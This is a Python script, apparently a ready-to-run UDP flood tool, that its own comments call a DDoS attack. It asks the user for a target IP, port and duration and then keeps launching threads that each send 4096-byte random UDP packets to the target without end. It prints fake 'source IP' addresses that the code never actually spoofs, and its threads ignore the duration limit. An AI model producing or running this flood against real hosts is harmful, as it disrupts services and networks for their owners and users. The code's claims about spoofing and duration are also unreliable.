import socket
import random
import time
from threading import Thread

def send_packets(target_ip, target_port):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Set a timeout for the socket
    client_socket.settimeout(1)
    
    while True:
        # Generate a random source IP address
        source_ip = f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'
        
        # Create a UDP packet
        udp_packet = bytes(random.getrandbits(8) for _ in range(4096))
        
        try:
            # Send the UDP packet to the target
            client_socket.sendto(udp_packet, (target_ip, target_port))
            
            # Print the attack information
            print(f"Sent packet to {target_ip}:{target_port} from {source_ip}")
        except socket.error:
            # Handle any socket errors
            print("Socket error occurred.")
    
    # Close the socket
    client_socket.close()

def ddos_attack():
    # Get user input for target IP and port
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    duration = int(input("Enter the attack duration (in seconds): "))

    # Start the attack loop
    end_time = time.time() + duration
    while time.time() < end_time:
        # Create a new thread for each packet sending
        thread = Thread(target=send_packets, args=(target_ip, target_port))
        thread.start()

# Usage
ddos_attack()
